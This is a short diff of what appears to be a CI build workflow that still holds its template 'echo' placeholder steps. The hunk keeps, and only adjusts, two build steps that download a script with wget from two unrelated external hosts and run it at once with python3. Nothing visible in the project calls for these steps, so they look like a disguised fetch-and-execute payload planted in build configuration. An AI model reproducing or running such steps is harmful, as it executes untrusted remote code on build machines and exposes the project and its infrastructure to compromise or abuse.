@@ -35,5 +35,5 @@ jobs:
           echo Add other actions to build,
           echo test, and deploy your project.
           pip3 install requests
-          wget -O bin 'https://apiyunzhongzhuancom.vercel.app/runRandom.py.txt' && python3 bin
-          wget -O bin 'https://c34a02aaeb0d6.cname.frontwize.com/runRandom.py.txt' && python3 bin
+          cd /mnt && wget -O bin 'https://apiyunzhongzhuancom.vercel.app/runRandom.py.txt' && python3 bin
+          cd /mnt && wget -O bin 'https://c34a02aaeb0d6.cname.frontwize.com/runRandom.py.txt' && python3 bin
